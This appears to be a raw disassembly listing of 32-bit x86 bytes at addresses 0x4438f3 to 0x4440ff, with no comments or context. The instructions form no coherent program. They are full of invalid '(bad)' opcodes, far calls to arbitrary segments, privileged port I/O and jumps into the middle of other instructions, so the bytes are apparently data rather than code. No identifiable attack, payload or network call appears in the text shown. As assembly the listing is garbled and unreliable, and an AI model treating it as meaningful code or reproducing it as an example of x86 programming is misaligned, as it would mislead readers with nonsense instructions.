  4438f3:	push   cs
  4438f4:	add    al,0xa2
  4438f6:	call   0xfad2:0x8b766bae
  4438fd:	adc    eax,0x4cffff39
  443902:	jg     0x44388e
  443904:	out    0x9a,al
  443906:	pop    ss
  443907:	dec    eax
  443908:	ins    DWORD PTR es:[edi],dx
  443909:	jmp    FWORD PTR [edx+0x3b59b103]
  44390f:	or     al,0x5f
  443911:	xor    edi,DWORD PTR [eax+0x6988e917]
  443917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443918:	xlat   BYTE PTR ds:[ebx]
  443919:	loopne 0x443943
  44391b:	xchg   ebp,eax
  44391c:	das    
  44391d:	jns    0x443939
  44391f:	data16 or al,0xc
  443922:	call   0xd5a5:0x7881c18b
  443929:	aad    0x53
  44392b:	dec    ebx
  44392c:	jns    0x443981
  44392e:	sub    dh,BYTE PTR [ebx]
  443930:	mov    dl,0xeb
  443932:	retf   0xe995
  443935:	hlt    
  443936:	out    dx,al
  443937:	cmp    esi,DWORD PTR [edx-0x68219bf8]
  44393d:	in     eax,0xce
  44393f:	jecxz  0x443947
  443941:	or     esi,DWORD PTR [esi-0x3d]
  443944:	push   0x65fc6d42
  443949:	ja     0x4438e5
  44394b:	adc    eax,0x26376832
  443950:	dec    esp
  443951:	lahf   
  443952:	pop    edx
  443953:	mov    al,ds:0x6599104d
  443958:	cmp    BYTE PTR [ebx],0x6d
  44395b:	mov    al,BYTE PTR [eax+0x3b]
  44395e:	popf   
  44395f:	inc    eax
  443960:	fisttp WORD PTR [esi]
  443962:	cs push 0x7c4fb981
  443968:	int    0x8b
  44396a:	jle    0x4439b5
  44396c:	add    eax,0xbb673757
  443971:	xchg   esp,eax
  443972:	jo     0x44393b
  443974:	mov    dl,0xd8
  443976:	push   edx
  443977:	cmp    al,0x96
  443979:	mov    dl,0x84
  44397b:	dec    eax
  44397c:	pushf  
  44397d:	pop    ecx
  44397e:	(bad)  
  443980:	pop    es
  443981:	pop    edi
  443982:	sub    BYTE PTR [eax-0x18],ah
  443985:	or     al,BYTE PTR [edi+0x5b]
  443988:	jb     0x4439be
  44398a:	or     al,0xc1
  44398c:	fs sti 
  44398e:	ficomp DWORD PTR [edx-0x4d]
  443991:	jae    0x4439a9
  443993:	or     eax,0x5ca2cd5
  443998:	data16 sti 
  44399a:	popa   
  44399b:	push   ebp
  44399c:	imul   ecx,DWORD PTR [ebx],0x41
  44399f:	(bad)
  4439a2:	cmp    eax,0x9b530f4d
  4439a7:	dec    esi
  4439a8:	(bad)  
  4439a9:	addr16 mov bl,0xe4
  4439ac:	mov    ah,0x6c
  4439ae:	data16 stos BYTE PTR es:[edi],al
  4439b0:	ror    BYTE PTR [esi+eiz*4],0xad
  4439b4:	xor    dh,BYTE PTR [ecx+0x35d4473c]
  4439ba:	inc    esp
  4439bb:	sub    BYTE PTR [edx-0x20d236c1],dh
  4439c1:	into   
  4439c2:	ins    DWORD PTR es:[edi],dx
  4439c3:	jne    0x443972
  4439c5:	or     al,0xa6
  4439c7:	mov    bh,0x13
  4439c9:	stos   DWORD PTR es:[edi],eax
  4439ca:	push   ss
  4439cb:	sub    al,0x32
  4439cd:	pushf  
  4439ce:	std    
  4439cf:	jecxz  0x4439f1
  4439d1:	cmp    bl,BYTE PTR [ebp+0xb253ae4]
  4439d7:	sbb    al,BYTE PTR [ebp+0x45c89a2c]
  4439dd:	sti    
  4439de:	mov    WORD PTR [ecx+0x1088748a],gs
  4439e4:	xchg   edx,eax
  4439e5:	ds ds test eax,0xda9d328c
  4439ec:	dec    BYTE PTR [ebx-0x54]
  4439ef:	jle    0x4439e3
  4439f1:	adc    ebx,DWORD PTR [esi-0x14]
  4439f4:	dec    esi
  4439f5:	or     ecx,DWORD PTR [ecx-0x435b4c12]
  4439fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4439fc:	xor    BYTE PTR [ebx],ch
  4439fe:	call   0x44b6:0x27f659da
  443a05:	add    eax,0xda00a6aa
  443a0a:	clc    
  443a0b:	and    esi,ebx
  443a0d:	mov    al,ds:0xfb025687
  443a12:	cld    
  443a13:	mov    ds:0x27c78388,al
  443a18:	jns    0x4439f3
  443a1a:	sahf   
  443a1b:	loope  0x443a19
  443a1d:	daa    
  443a1e:	(bad)  
  443a1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443a20:	outs   dx,DWORD PTR ds:[esi]
  443a21:	test   DWORD PTR [esi-0x1fadeb88],edx
  443a27:	std    
  443a28:	mov    dl,0xe1
  443a2a:	fld    QWORD PTR [ecx+0x2f]
  443a2d:	or     eax,0xb13c505
  443a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443a33:	and    al,0x18
  443a35:	sub    dl,0xb8
  443a38:	jecxz  0x4439c5
  443a3a:	call   0x79c4:0xbaa759a4
  443a41:	ret    0xd1aa
  443a44:	inc    esp
  443a45:	or     eax,DWORD PTR [edi-0x43]
  443a48:	mov    al,ds:0xf818faf2
  443a4d:	add    BYTE PTR [edx-0x70753a41],bl
  443a53:	and    esp,DWORD PTR gs:[ecx]
  443a56:	or     al,0xa4
  443a58:	mov    ah,0xfc
  443a5a:	jne    0x443a33
  443a5c:	jl     0x443a8d
  443a5e:	push   ecx
  443a5f:	xor    eax,0xccd3a12a
  443a64:	scas   eax,DWORD PTR es:[edi]
  443a65:	ret    0x2879
  443a68:	xor    al,0x8
  443a6a:	into   
  443a6b:	fnstenv [ebx+ecx*1-0x17]
  443a6f:	ret    0xbde8
  443a72:	add    eax,0x9a928e2e
  443a77:	call   0x7bd8e863
  443a7c:	fbld   TBYTE PTR [edx+0x6e30a77f]
  443a82:	mov    ch,0x44
  443a84:	push   0xffffffd0
  443a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443a87:	sub    eax,0x65b8f5b2
  443a8c:	jp     0x443ae2
  443a8e:	dec    ebp
  443a8f:	(bad)  
  443a90:	xchg   edi,eax
  443a91:	or     edi,DWORD PTR [edx+eax*8]
  443a94:	test   DWORD PTR [ebx+0x71],esp
  443a97:	retf   0xd867
  443a9a:	call   0x811b:0x52422d2f
  443aa1:	mov    ebp,DWORD PTR [edx-0x66]
  443aa4:	xor    BYTE PTR [edi+0x1a],bl
  443aa7:	test   al,0x64
  443aa9:	fldcw  WORD PTR [esi-0x3c]
  443aac:	mov    eax,ds:0x3c989d99
  443ab1:	sar    BYTE PTR [edx+ebx*1-0x5a93f52e],0x4e
  443ab9:	add    BYTE PTR [ebp+0x77],dh
  443abc:	inc    ecx
  443abd:	add    DWORD PTR [ecx],ebx
  443abf:	push   0x384ad46c
  443ac4:	xor    DWORD PTR [ebp-0x66],0x6b
  443ac8:	icebp  
  443ac9:	mov    bh,0xaf
  443acb:	inc    esi
  443acc:	(bad)  
  443acd:	cmc    
  443ace:	or     ah,BYTE PTR [eax+0x302d8845]
  443ad4:	push   esi
  443ad5:	mov    esp,DWORD PTR ds:0x9a3b4bc0
  443adb:	or     DWORD PTR [ebx+0xa8e2fad],edi
  443ae1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443ae2:	idiv   DWORD PTR [ecx+0x26903ce1]
  443ae8:	ret    
  443ae9:	enter  0x7223,0xca
  443aed:	call   FWORD PTR [esi+0x58]
  443af0:	scas   eax,DWORD PTR es:[edi]
  443af1:	std    
  443af2:	or     DWORD PTR [edx+esi*8-0x51],edx
  443af6:	mov    DWORD PTR [ecx],esp
  443af8:	inc    esp
  443afa:	test   BYTE PTR [ecx-0x63],bl
  443afd:	and    eax,0x155679b2
  443b02:	shl    BYTE PTR [ecx+edx*1],0xdb
  443b06:	aaa    
  443b07:	sub    esi,DWORD PTR [edx+0x54]
  443b0a:	dec    eax
  443b0b:	sbb    ecx,DWORD PTR [edx+0x41]
  443b0e:	cdq    
  443b0f:	jecxz  0x443ada
  443b11:	ret    
  443b12:	popf   
  443b13:	sub    eax,0xb860fb56
  443b18:	in     al,dx
  443b19:	jno    0x443b0a
  443b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443b1c:	arpl   WORD PTR [eax-0x68],cx
  443b1f:	mov    ds:0xc73e639e,eax
  443b24:	mov    dl,0xb6
  443b26:	xor    eax,0xda1fca79
  443b2b:	idiv   ch
  443b2d:	or     ebx,DWORD PTR [ebx]
  443b2f:	jno    0x443b81
  443b31:	fs mov esi,0x9a864b73
  443b37:	les    ecx,FWORD PTR [ecx+0x52856889]
  443b3d:	adc    DWORD PTR [edx],esi
  443b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443b40:	es push cs
  443b42:	xchg   esi,eax
  443b43:	adc    esi,eax
  443b45:	mov    bl,0x28
  443b47:	fwait
  443b48:	scas   al,BYTE PTR es:[edi]
  443b49:	and    esp,DWORD PTR ds:0x110f32a5
  443b4f:	add    eax,0xa765e6b9
  443b54:	and    bl,BYTE PTR [eax+0x40]
  443b57:	enter  0x265e,0xf1
  443b5b:	mov    ebp,0xfd8240b5
  443b60:	test   eax,0x74c38aa7
  443b65:	ja     0x443b70
  443b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443b68:	xchg   edi,eax
  443b69:	sar    ecx,1
  443b6b:	(bad)  
  443b6d:	adc    BYTE PTR [ebx-0x45],0xb3
  443b71:	lods   al,BYTE PTR ds:[esi]
  443b72:	(bad)
  443b75:	ror    bh,1
  443b77:	int3   
  443b78:	adc    BYTE PTR [edi-0x61],0xa7
  443b7c:	clc    
  443b7d:	mov    ebx,0xc8ee2594
  443b82:	and    ah,BYTE PTR [edx-0x4e]
  443b85:	retf   
  443b86:	frndint 
  443b88:	into   
  443b89:	mov    bh,0xb1
  443b8b:	loope  0x443bfc
  443b8d:	adc    al,0x2d
  443b8f:	inc    esi
  443b90:	scas   eax,DWORD PTR es:[edi]
  443b91:	(bad)  
  443b92:	fs daa 
  443b94:	pop    edi
  443b95:	fnstenv [edx]
  443b97:	sub    DWORD PTR [eax+ebp*1],0x67b63e9a
  443b9e:	or     al,0x5c
  443ba0:	lods   al,BYTE PTR ds:[esi]
  443ba1:	pop    es
  443ba2:	pop    es
  443ba3:	mov    al,0x4b
  443ba5:	fisub  WORD PTR [ebx]
  443ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443ba8:	sbb    ebx,DWORD PTR [ebx+0x59b5db2a]
  443bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443baf:	repz jg 0x443c28
  443bb2:	call   0xec62:0x28c59168
  443bb9:	cmp    eax,0x302a7a3
  443bbe:	(bad)  
  443bc1:	jbe    0x443b52
  443bc3:	(bad)  
  443bc4:	mov    dl,0xf1
  443bc6:	hlt    
  443bc7:	mov    ecx,0x377e381
  443bcc:	pop    ebx
  443bcd:	add    al,0xbf
  443bcf:	mov    eax,ds:0x811a4321
  443bd4:	(bad)  
  443bd5:	cmp    ebp,esp
  443bd7:	push   esp
  443bd8:	mov    bh,0xaa
  443bda:	sbb    eax,0x5af4691c
  443bdf:	in     al,0xef
  443be1:	or     BYTE PTR [ebx-0x5c],bl
  443be4:	mov    bh,0xf
  443be6:	push   ss
  443be7:	dec    eax
  443be8:	in     al,0x3e
  443bea:	inc    edx
  443beb:	mov    ch,0xfd
  443bed:	and    al,0x93
  443bef:	sbb    edi,DWORD PTR [esp+ebp*2]
  443bf2:	imul   esp,DWORD PTR [edi-0x18e855d1],0x1fba0a16
  443bfc:	cmp    bh,BYTE PTR [edi+0x4b]
  443bff:	jg     0x443bef
  443c01:	out    0x10,eax
  443c03:	and    esi,DWORD PTR [edx+0x20ba5eee]
  443c09:	cmp    al,0x40
  443c0b:	fnclex 
  443c0d:	or     eax,ebx
  443c0f:	mov    eax,DWORD PTR [ecx+0x1f973674]
  443c15:	sub    ebx,DWORD PTR [edx+0x32f5161e]
  443c1b:	pop    ds
  443c1c:	sti    
  443c1d:	test   DWORD PTR [esp+eiz*4-0x57306e3a],esi
  443c24:	mov    esi,0xfe0e6217
  443c29:	popa   
  443c2a:	fwait
  443c2b:	test   ecx,ebx
  443c2d:	ss ret 
  443c2f:	mov    ds:0xc256939d,eax
  443c34:	jmp    0xbec6:0x35266d06
  443c3b:	push   esp
  443c3c:	inc    edx
  443c3d:	adc    eax,0x8db38555
  443c42:	jne    0x443c88
  443c44:	and    al,0xd3
  443c46:	xchg   esi,eax
  443c47:	cmp    DWORD PTR [esi+0x56],esi
  443c4a:	cwde   
  443c4b:	fsub   DWORD PTR [ebx-0x7f58fd8b]
  443c51:	xchg   BYTE PTR [edx-0x2d],bh
  443c54:	dec    edx
  443c55:	imul   edi,esi,0x6c
  443c58:	mov    al,0xd2
  443c5a:	jmp    0x6c67:0x8c76764f
  443c61:	ins    BYTE PTR es:[edi],dx
  443c62:	xor    bl,dl
  443c64:	jmp    0x584f:0xba914c0b
  443c6b:	xchg   edx,eax
  443c6c:	retf   
  443c6d:	and    BYTE PTR [ebx-0x71bf860c],bl
  443c73:	push   es
  443c74:	arpl   WORD PTR [esi],si
  443c76:	jbe    0x443cf1
  443c78:	sub    ebx,DWORD PTR ds:0xbf175ac
  443c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443c7f:	sub    al,0x6
  443c81:	sahf   
  443c82:	mov    esp,0x4e00b27d
  443c87:	hlt    
  443c88:	cmp    eax,0xa776455b
  443c8d:	or     BYTE PTR [eax-0x18624263],bl
  443c93:	add    eax,0x5150320a
  443c98:	mov    dl,0xfc
  443c9a:	adc    eax,0xf571fbf8
  443c9f:	in     al,0xc6
  443ca1:	or     edi,DWORD PTR [esi+ecx*2]
  443ca4:	push   edx
  443ca5:	push   0xffffffe2
  443ca7:	push   esp
  443ca8:	mov    edi,DWORD PTR [edx+0x3e063398]
  443cae:	repnz or bl,BYTE PTR [esi+0x17cbddcb]
  443cb5:	add    bh,BYTE PTR [ebp+0x3e]
  443cb8:	cmp    al,0xa5
  443cba:	call   0xac13:0x17220ad3
  443cc1:	jne    0x443c92
  443cc3:	lods   eax,DWORD PTR ds:[esi]
  443cc4:	repz ret 0xa000
  443cc8:	or     BYTE PTR [esi+0x52],dh
  443ccb:	inc    edi
  443ccc:	adc    eax,0x26535e0c
  443cd1:	and    al,0xad
  443cd3:	pop    ss
  443cd4:	clc    
  443cd5:	xor    DWORD PTR [edi],0x4c
  443cd8:	push   eax
  443cd9:	or     BYTE PTR [edx-0x28af95c2],bl
  443cdf:	mov    al,0x30
  443ce1:	sbb    esi,eax
  443ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443ce4:	pextrw esp,(bad),0xc5
  443ce6:	repnz fistp WORD PTR [bx+si]
  443cea:	jo     0x443c9a
  443cec:	mov    dl,0x37
  443cee:	mov    ebp,DWORD PTR [edx-0x53]
  443cf1:	int3   
  443cf2:	les    edx,FWORD PTR [ebx]
  443cf4:	sbb    eax,0x4a7277e
  443cf9:	mov    ah,0xf9
  443cfb:	fs jae 0x443d24
  443cfe:	add    BYTE PTR [ebp-0x5b],0x56
  443d02:	not    DWORD PTR [eax-0x54]
  443d05:	push   ecx
  443d06:	aad    0x85
  443d08:	jmp    FWORD PTR [ebx-0x1c]
  443d0b:	mov    eax,0xa77ee6cd
  443d10:	out    0xf1,eax
  443d12:	cli    
  443d13:	jmp    0x443d57
  443d15:	add    eax,ecx
  443d17:	scas   eax,DWORD PTR es:[edi]
  443d18:	inc    esi
  443d19:	clc    
  443d1a:	in     al,dx
  443d1b:	je     0x443cc5
  443d1d:	pop    ebp
  443d1e:	mov    ah,bl
  443d20:	es dec ebx
  443d22:	xchg   edx,eax
  443d23:	pop    edx
  443d24:	mov    ch,0xc
  443d26:	sbb    al,0x84
  443d28:	dec    ebx
  443d29:	cmp    al,0x82
  443d2b:	or     WORD PTR [ebx],ax
  443d2e:	stos   DWORD PTR es:[edi],eax
  443d2f:	push   ebx
  443d30:	ja     0x443d29
  443d32:	call   0xd750:0x81cbf5f2
  443d39:	dec    edx
  443d3a:	ins    BYTE PTR es:[edi],dx
  443d3b:	popf   
  443d3c:	add    esp,DWORD PTR [edx+ebx*1+0x10]
  443d40:	outs   dx,BYTE PTR ds:[esi]
  443d41:	jmp    0x443d17
  443d43:	shr    BYTE PTR [edx],cl
  443d45:	inc    esp
  443d46:	xchg   ecx,eax
  443d47:	adc    al,0x55
  443d49:	sub    edx,DWORD PTR [ebx-0x59]
  443d4c:	pop    esp
  443d4d:	das    
  443d4e:	cwde   
  443d4f:	add    esp,DWORD PTR [edx+0xb]
  443d52:	cmp    al,bh
  443d54:	inc    esp
  443d55:	cli    
  443d56:	in     eax,dx
  443d57:	mov    fs,WORD PTR [ebx+0x703aa251]
  443d5d:	mov    edx,DWORD PTR [esi+0x15]
  443d60:	outs   dx,BYTE PTR ds:[esi]
  443d61:	mov    eax,0xbe35d6f
  443d66:	or     edi,DWORD PTR [eax-0x19]
  443d69:	jo     0x443d67
  443d6b:	xor    eax,0xc9a18cef
  443d70:	mov    ds:0xcb65238b,al
  443d75:	pop    ds
  443d76:	sub    DWORD PTR [ecx],edx
  443d78:	stos   BYTE PTR es:[edi],al
  443d79:	or     edi,eax
  443d7b:	adc    esp,DWORD PTR [edi-0x56]
  443d7e:	pop    ds
  443d7f:	pop    eax
  443d80:	cmc    
  443d81:	mov    ebx,0x28b3bbe1
  443d86:	test   al,0xb7
  443d88:	outs   dx,DWORD PTR ds:[esi]
  443d89:	ss sbb edi,edx
  443d8c:	outs   dx,BYTE PTR ds:[esi]
  443d8d:	and    ecx,0x191821a7
  443d93:	(bad)  
  443d94:	sub    DWORD PTR [edx],edx
  443d96:	aad    0x78
  443d98:	mov    dl,0xa2
  443d9a:	(bad)  
  443d9b:	in     al,0x14
  443d9d:	pop    esi
  443d9e:	dec    edx
  443d9f:	cmp    ch,dl
  443da1:	or     ecx,DWORD PTR [ebx-0x7e70ba28]
  443da7:	cmp    BYTE PTR [ecx+0x753d99e9],0xfb
  443dae:	xchg   esp,eax
  443daf:	shr    esi,cl
  443db1:	mov    ds:0xbcb9085,eax
  443db6:	inc    esp
  443db7:	cmp    DWORD PTR [esp+ebx*4-0x19b78729],esp
  443dbe:	call   0x2955:0xe7dbaac7
  443dc5:	data16 sbb ah,BYTE PTR [edi-0x7ee6a52d]
  443dcc:	mov    DWORD PTR [esi],ebp
  443dce:	fidivr DWORD PTR [ecx-0x58974506]
  443dd4:	inc    ecx
  443dd5:	pop    ds
  443dd6:	jle    0x443df3
  443dd8:	cmc    
  443dd9:	mov    ds:0xb114ff3,al
  443dde:	cmc    
  443ddf:	loope  0x443e5b
  443de1:	mov    ecx,DWORD PTR [eax-0x65c4b981]
  443de7:	sub    BYTE PTR ss:[edx-0x6d],ch
  443deb:	fidiv  DWORD PTR [edi]
  443ded:	imul   ecx,esi,0xffffffa5
  443df0:	cdq    
  443df1:	test   DWORD PTR [esi+0x1b],ebx
  443df4:	dec    edi
  443df5:	cli    
  443df6:	jp     0x443dfd
  443df8:	xor    eax,0x72d49dd6
  443dfd:	pop    esp
  443dfe:	sub    ebx,ebp
  443e00:	cmp    BYTE PTR [edi+0xb37e5c3],0x94
  443e07:	jecxz  0x443e80
  443e09:	rol    DWORD PTR [edi],cl
  443e0b:	enter  0x3659,0x95
  443e0f:	aaa    
  443e10:	(bad)  
  443e11:	aad    0xfc
  443e13:	daa    
  443e14:	scas   al,BYTE PTR es:[edi]
  443e15:	push   esp
  443e16:	je     0x443e47
  443e18:	test   DWORD PTR ds:0x29b37eb1,eax
  443e1e:	jp     0x443e1f
  443e20:	jnp    0x443e7f
  443e22:	jp     0x443e49
  443e24:	mov    dl,0xc8
  443e26:	mov    ebx,0x220f7c53
  443e2b:	sub    eax,0xcadd02f0
  443e30:	mov    DWORD PTR [edx],edi
  443e32:	call   0x22d8:0x65b439b8
  443e39:	retf   
  443e3a:	loopne 0x443e7c
  443e3c:	lods   al,BYTE PTR ds:[esi]
  443e3d:	xor    eax,0x2ab32ebf
  443e42:	dec    esp
  443e43:	jecxz  0x443e9c
  443e45:	sub    eax,0x83183ed9
  443e4a:	mov    ch,0xdb
  443e4c:	mov    ecx,DWORD PTR [ebx]
  443e4e:	sbb    BYTE PTR [ecx],0xa9
  443e51:	jle    0x443e94
  443e53:	push   edi
  443e54:	es dec esp
  443e56:	call   0x2c44:0xbfa4ff8f
  443e5d:	adc    DWORD PTR [edi+0x49bcb8a7],0x2
  443e64:	inc    ebx
  443e65:	cmp    ah,BYTE PTR [ebp-0x1f]
  443e68:	mov    dl,0xf2
  443e6a:	hlt    
  443e6b:	mov    ebp,0xe5ac753f
  443e70:	inc    esi
  443e71:	or     ebp,DWORD PTR [ecx+0x53c6c884]
  443e77:	push   cs
  443e78:	xor    al,ch
  443e7a:	call   0xa3ac:0x86fd191c
  443e81:	nop
  443e82:	cwde   
  443e83:	fldenv [ebp+0x1a4de60b]
  443e89:	mov    esi,0x7c491927
  443e8e:	xchg   esp,eax
  443e8f:	pop    ds
  443e90:	in     al,dx
  443e91:	adc    eax,0x8d3667d2
  443e96:	js     0x443ecf
  443e98:	mov    DWORD PTR [ebx],ecx
  443e9a:	dec    esp
  443e9b:	jp     0x443e82
  443e9d:	das    
  443e9e:	or     eax,0x9997c52f
  443ea3:	push   ebx
  443ea4:	adc    bh,BYTE PTR [eax-0x3cef4a99]
  443eaa:	inc    eax
  443eab:	xchg   edi,eax
  443eac:	inc    ebp
  443ead:	or     ebx,eax
  443eaf:	mov    ss,WORD PTR [edx+0x7]
  443eb2:	stos   DWORD PTR es:[edi],eax
  443eb3:	mov    al,0x78
  443eb5:	out    dx,al
  443eb6:	call   0xd482:0x6af3419a
  443ebd:	jns    0x443f1d
  443ebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443ec0:	int    0xc2
  443ec2:	aas    
  443ec3:	push   ds
  443ec4:	sti    
  443ec5:	cmp    dl,bh
  443ec7:	mov    eax,0x3a67feb2
  443ecc:	adc    al,0xcc
  443ece:	aam    0xc7
  443ed0:	mov    esi,0xd369780b
  443ed5:	adc    DWORD PTR [ebx],edx
  443ed7:	das    
  443ed8:	add    BYTE PTR [ebp-0x66],cl
  443edb:	add    al,0x5d
  443edd:	add    eax,0x338caf6b
  443ee2:	adc    eax,0xf0b5f1f
  443ee7:	push   ebx
  443ee8:	pop    edx
  443ee9:	cmp    edx,DWORD PTR [esi-0x4e]
  443eec:	loopne 0x443eef
  443eee:	call   0x7f63:0x59d3b408
  443ef5:	dec    edx
  443ef6:	jl     0x443e9f
  443ef8:	cmp    BYTE PTR [ebp+0x76a58b0e],0x94
  443eff:	les    edi,FWORD PTR [bx+di-0x66]
  443f03:	push   cs
  443f04:	mov    eax,ds:0xef83dfb4
  443f09:	ret    0xa79c
  443f0c:	adc    eax,0xeba60b64
  443f11:	imul   esi,DWORD PTR [ebx+0x7e8eb2ef],0x863ca7ea
  443f1b:	adc    eax,0xa766eb30
  443f20:	pop    eax
  443f21:	leave  
  443f22:	push   eax
  443f23:	mov    edx,0xc0f8794
  443f28:	mov    dl,0x13
  443f2a:	sbb    edi,ebx
  443f2c:	adc    al,0x3d
  443f2e:	or     DWORD PTR [edi],eax
  443f30:	sub    al,0xb
  443f32:	fcomp  QWORD PTR [esi+0x788b6f1f]
  443f38:	mov    ch,0xcc
  443f3a:	call   0x7da1:0x3b789792
  443f41:	call   0xb76ce680
  443f46:	jnp    0x443ef4
  443f48:	in     eax,dx
  443f49:	out    0xd8,eax
  443f4b:	adc    eax,0x291167b2
  443f50:	lds    eax,FWORD PTR gs:[edx-0x1a]
  443f54:	ret    0xbb0c
  443f57:	push   esi
  443f58:	js     0x443f98
  443f5a:	and    edi,esi
  443f5c:	call   0x1649:0xb2095863
  443f63:	jns    0x443ef4
  443f65:	inc    eax
  443f66:	sub    eax,0xae254acb
  443f6b:	xor    BYTE PTR [edi-0x47b62af5],al
  443f71:	push   ebx
  443f72:	add    esi,DWORD PTR [ebx-0x4e]
  443f75:	xor    dl,dl
  443f77:	rcl    BYTE PTR [edi+0x46],cl
  443f7a:	rol    DWORD PTR [eax-0x1c],1
  443f7d:	or     edi,DWORD PTR [eax-0x42]
  443f80:	pop    esi
  443f81:	inc    edx
  443f82:	jno    0x443f59
  443f84:	sbb    eax,0x8b109acf
  443f89:	int    0x4b
  443f8b:	(bad)  
  443f8c:	pop    eax
  443f8d:	and    eax,0x9f5a4b3
  443f92:	outs   dx,BYTE PTR ds:[esi]
  443f93:	sub    al,0x62
  443f95:	jnp    0x443ff9
  443f97:	lds    ebp,FWORD PTR [ecx+ebx*8-0x66]
  443f9b:	xor    dl,BYTE PTR [eax]
  443f9d:	and    BYTE PTR [ebp+0x2976384a],cl
  443fa3:	add    DWORD PTR [ebx-0x12],0xe155a7c4
  443faa:	mov    ds:0x9a271709,al
  443faf:	outs   dx,BYTE PTR ds:[esi]
  443fb0:	xor    ebp,ebx
  443fb2:	icebp  
  443fb3:	mov    ds:0xa736c112,eax
  443fb8:	cwde   
  443fb9:	dec    ecx
  443fba:	pushf  
  443fbb:	daa    
  443fbc:	mov    edx,0xb34d2125
  443fc1:	retfw  
  443fc3:	out    0xf7,al
  443fc5:	and    ch,BYTE PTR [ebx+eiz*1]
  443fc8:	push   0xffffffe3
  443fca:	clc    
  443fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443fcc:	fld    DWORD PTR [edx-0x33f280b3]
  443fd2:	mov    esp,0xbba7b24c
  443fd7:	or     eax,0xf193f768
  443fdc:	shl    BYTE PTR [edx],0xf4
  443fdf:	push   esp
  443fe0:	bound  esi,QWORD PTR [esi+0x7a0fa73a]
  443fe6:	dec    ebp
  443fe7:	nop
  443fe8:	or     BYTE PTR [ebx-0x304d1c25],0x88
  443fef:	(bad)  
  443ff0:	call   0x8e759252
  443ff5:	or     ecx,edi
  443ff7:	fs stos BYTE PTR es:[edi],al
  443ff9:	mov    bh,0xfd
  443ffb:	(bad)  
  443ffd:	jp     0x443f99
  443fff:	(bad)
  444002:	xchg   BYTE PTR [ebx],bh
  444004:	and    ecx,esi
  444006:	and    DWORD PTR [esi+0x1a700733],esp
  44400c:	jmp    0x443fea
  44400e:	mov    esi,edx
  444010:	push   edi
  444011:	dec    ebx
  444012:	call   0x9a831139
  444017:	(bad)  
  444018:	sti    
  444019:	bound  eax,QWORD PTR [eax+0x7]
  44401c:	mov    DWORD PTR ds:[esi+0xccd2a7],esi
  444023:	data16 and bh,BYTE PTR [ebp+0x5eb2bef1]
  44402a:	aam    0x39
  44402c:	mov    bh,0xab
  44402e:	cmp    BYTE PTR [edi],bh
  444030:	push   ebp
  444031:	aaa    
  444032:	imul   ebx,DWORD PTR [eax],0x3ad574b5
  444038:	lods   eax,DWORD PTR ds:[esi]
  444039:	repnz adc eax,0xe8eb72b0
  44403f:	mov    DWORD PTR [ebp-0x548064d3],esp
  444045:	dec    ecx
  444046:	into   
  444047:	cli    
  444048:	mov    DWORD PTR [ebp+0xcd0834a],ecx
  44404e:	pushf  
  44404f:	xchg   esp,eax
  444050:	sar    DWORD PTR [esi],0xcf
  444053:	mov    bh,0xe4
  444055:	pop    eax
  444056:	retf   
  444057:	sbb    BYTE PTR [esi-0x4d66c9ac],0x2f
  44405e:	xchg   ebx,eax
  44405f:	out    0x8b,al
  444061:	aaa    
  444062:	outs   dx,DWORD PTR ds:[esi]
  444063:	(bad)  [eax+0xb]
  444066:	bound  edi,QWORD PTR [edi+eiz*2]
  444069:	sub    DWORD PTR [eax],ebx
  44406b:	mov    ebp,0x61a2e49b
  444070:	adc    BYTE PTR [eax+esi*8],0x3e
  444074:	xor    ah,BYTE PTR [edi+eiz*8+0x1]
  444078:	sbb    ch,ah
  44407a:	dec    ebx
  44407b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44407c:	or     esi,DWORD PTR [edi-0x31c0e827]
  444082:	lods   eax,DWORD PTR ds:[esi]
  444083:	add    esi,DWORD PTR [edx-0x5322c6e]
  444089:	and    al,0x20
  44408b:	push   edx
  44408c:	adc    ecx,DWORD PTR [ebx]
  44408e:	xchg   esp,eax
  44408f:	and    edx,DWORD PTR [ebx-0x63d71eee]
  444095:	xchg   esp,eax
  444096:	call   0x6d98:0x2aa4a020
  44409d:	or     cl,dh
  44409f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4440a0:	inc    ebp
  4440a1:	in     al,0xad
  4440a3:	outs   dx,BYTE PTR ds:[esi]
  4440a4:	inc    ebx
  4440a5:	iret   
  4440a6:	adc    eax,0xb92eb22d
  4440ab:	mov    al,ds:0xdd9f19da
  4440b0:	cmp    al,0xb
  4440b2:	push   esi
  4440b3:	pop    esi
  4440b4:	push   edx
  4440b5:	dec    edx
  4440b6:	outs   dx,DWORD PTR ds:[esi]
  4440b7:	sbb    al,0x30
  4440b9:	in     eax,dx
  4440ba:	call   0x7baa:0x74fce907
  4440c1:	fld    TBYTE PTR [ebp+0x47090bdf]
  4440c7:	cmp    ecx,DWORD PTR [ebx-0x6d]
  4440ca:	cmp    eax,0x3073d25d
  4440cf:	(bad)  [edx+0x708ae3d9]
  4440d5:	cdq    
  4440d6:	xor    dl,BYTE PTR [eax-0x4a46ce3a]
  4440dc:	xor    cl,BYTE PTR [edi-0x1f]
  4440df:	push   ecx
  4440e0:	aam    0xec
  4440e2:	jae    0x444117
  4440e4:	pop    edx
  4440e5:	rcr    DWORD PTR [edx+0x573801c7],0x82
  4440ec:	ds je  0x444145
  4440ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4440f0:	test   eax,0x51278bf4
  4440f5:	sbb    eax,0x9ab3a6b5
  4440fa:	sbb    cl,dl
  4440fc:	cld    
  4440fd:	jb     0x44408e
  4440ff:	push   ds
